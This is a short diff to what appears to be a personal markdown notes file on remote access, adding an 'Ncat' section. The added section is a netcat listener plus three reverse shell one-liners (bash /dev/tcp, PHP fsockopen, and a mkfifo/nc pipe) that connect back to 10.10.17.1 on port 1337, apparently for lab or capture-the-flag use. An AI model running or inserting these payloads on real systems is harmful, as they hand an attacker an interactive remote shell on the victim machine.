@@ -45,6 +45,23 @@ device_user$     ssh -R localhost:7070:localhost:22 abc_user@abc.com
 abc-user$     ssh -p 7070 device_user@localhost
 ```
 
+### Ncat
+
+#### server
+```
+ncat -l -p 1337
+```
+#### remote to get shell onto
+```
+/bin/bash -i >& /dev/tcp/10.10.17.1/1337 0>&1
+
+php -r '$sock=fsockopen("10.10.17.1",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.1 1337 >/tmp/f
+
+```
+
+
 
 
 ### BBB Iot Buster Debian
